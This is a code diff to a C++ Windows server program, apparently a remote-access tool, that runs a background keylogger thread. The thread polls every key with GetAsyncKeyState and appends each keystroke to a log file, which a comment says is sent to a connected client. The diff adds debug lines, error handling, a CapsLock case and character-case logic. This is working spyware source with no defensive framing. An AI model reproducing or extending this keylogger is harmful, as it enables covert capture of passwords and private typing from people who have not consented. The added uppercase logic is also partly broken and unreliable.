@@ -349,10 +349,11 @@ void Server::startKeyLogger() {
     isLogging = true;
     if (!keyLoggerThread.joinable()) {
         keyLoggerThread = std::thread(&Server::keyLogger, this);
-        std::cout << "Keylogger started.\n";
+        std::cout << "Keylogger started in a new thread.\n";  // Debug line
+    } else {
+        std::cout << "Keylogger thread is already running.\n";  // Debug line
     }
 }
-
 // Function to stop keylogger and send log file to client
 void Server::stopKeyLogger(SOCKET clientSocket) {
     isLogging = false;
@@ -373,24 +374,68 @@ void Server::keyLogger() {
     // FreeConsole();
    
     FILE* OUTPUT_FILE = fopen(logFilePath.c_str(), "a+");
-    if (OUTPUT_FILE == nullptr) return;
+      if (OUTPUT_FILE == nullptr) {
+        std::cerr << "Failed to open log file.\n";  // Debug line
+        return;
+    }
 
     while (isLogging) {
         Sleep(10);
         std::cout << "Logging active...\n"; // Debug output to confirm loop entry
         for (int i = 8; i <= 255; i++) {
-            if (GetAsyncKeyState(i) == -32767) {
+           if (GetAsyncKeyState(i) == -32767) {
                 std::lock_guard<std::mutex> lock(logMutex);
+
+                // Handle special keys (Shift, Backspace, etc.)
                 switch (i) {
-                    case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]"); break;
-                    case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]"); break;
-                    case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]"); break;
-                    case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]"); break;
-                    case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]"); break;
-                    case VK_CONTROL: fprintf(OUTPUT_FILE, "[CTRL]"); break;
-                    case VK_MENU: fprintf(OUTPUT_FILE, "[ALT]"); break;
-                    case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]"); break;
-                    default: fprintf(OUTPUT_FILE, "%c", i); break;
+                    case VK_SHIFT: 
+                        fprintf(OUTPUT_FILE, "[SHIFT]"); 
+                        break;
+                    case VK_BACK: 
+                        fprintf(OUTPUT_FILE, "[BACKSPACE]"); 
+                        break;
+                    case VK_RETURN: 
+                        fprintf(OUTPUT_FILE, "[ENTER]"); 
+                        break;
+                    case VK_TAB: 
+                        fprintf(OUTPUT_FILE, "[TAB]"); 
+                        break;
+                    case VK_ESCAPE: 
+                        fprintf(OUTPUT_FILE, "[ESCAPE]"); 
+                        break;
+                    case VK_CONTROL: 
+                        fprintf(OUTPUT_FILE, "[CTRL]"); 
+                        break;
+                    case VK_MENU: 
+                        fprintf(OUTPUT_FILE, "[ALT]"); 
+                        break;
+                    case VK_SPACE: 
+                        fprintf(OUTPUT_FILE, "[SPACE]"); 
+                        break;
+                    case VK_CAPITAL: 
+                        fprintf(OUTPUT_FILE, "[CAPSLOCK]"); 
+                        break;
+                    default:
+                        // Handle printable characters
+                        if ((i >= 'A' && i <= 'Z') || (i >= 'a' && i <= 'z') || (i >= '0' && i <= '9') || 
+                            (i == '!' || i == '@' || i == '#' || i == '$' || i == '%' || i == '^' || 
+                            i == '&' || i == '*' || i == '(' || i == ')' || i == '-' || i == '+' || 
+                            i == '=' || i == '[' || i == ']' || i == '{' || i == '}' || i == '\\' || 
+                            i == ';' || i == '\'' || i == ',' || i == '.' || i == '/' || i == '?' || 
+                            i == '<' || i == '>' || i == ':' || i == '"' || i == '`' || i == '~')) {
+                            // Check if CapsLock is active or Shift is pressed
+                            bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+                            bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+
+                            // Determine if the key should be uppercase or lowercase
+                            if ((isCapsLockOn || isShiftPressed) && (i >= 'a' && i <= 'z')) {
+                                // Convert lowercase to uppercase
+                                fprintf(OUTPUT_FILE, "%c", i - 32);  // To uppercase (ASCII trick)
+                            } else {
+                                fprintf(OUTPUT_FILE, "%c", i);
+                            }
+                        }
+                        break;
                 }
                 fflush(OUTPUT_FILE);
             }
